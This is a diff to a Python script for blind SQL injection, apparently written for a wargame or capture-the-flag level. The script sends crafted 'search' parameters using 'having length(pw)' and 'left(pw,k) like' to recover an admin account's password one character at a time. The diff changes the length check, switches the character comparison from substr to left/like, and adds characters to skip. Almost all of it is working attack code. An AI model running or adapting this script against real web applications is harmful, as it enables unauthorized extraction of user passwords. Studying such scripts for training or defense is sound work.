@@ -10,7 +10,7 @@ length = 0
 while (1):
     length = length + 1
     query = {
-        'search' : """admin%' having length(pw) = """ + str(length) + """#"""
+        'search' : """admin%' having length(pw) < """ + str(length) + """#"""
     }
     param = parse.urlencode(query, encoding = 'UTF-8')
     Myurl = lvurl+param
@@ -27,17 +27,18 @@ while (1):
     idcheck = re.compile("[a][d][m][i][n]")
     if(idcheck.search(urllist[index+1].decode("utf-8"))):      
         break
+length = length - 1
 print("length : {}".format(length))
 
 
-password = []
+password = ""
 for k in range(length):
     for j in range(128):
         val = chr(j)
-        if(val == '&' or val == '|' or val == '_'):
+        if(val == '&' or val == '|' or val == '_' or val == '=' or val =='%'):
             continue
         query = {
-            'search' : """admin%' having substr(pw,"""+str(k+1)+""",1) = '""" + val + """'#"""
+            'search' : "admin%' having left(pw,"+str(k+1)+") like '" + password + val + "'#"
         }
         param = parse.urlencode(query, encoding = 'UTF-8')
         Myurl = lvurl+param
@@ -54,8 +55,7 @@ for k in range(length):
                 break
         idcheck = re.compile("[a][d][m][i][n]")
         if(idcheck.search(urllist[index+1].decode('utf-8'))):
-            password.append(val)
-            print ("".join(password))
+            password = password + val
             break
 print("password : ", end='')
-print("".join(password))
+print(password)
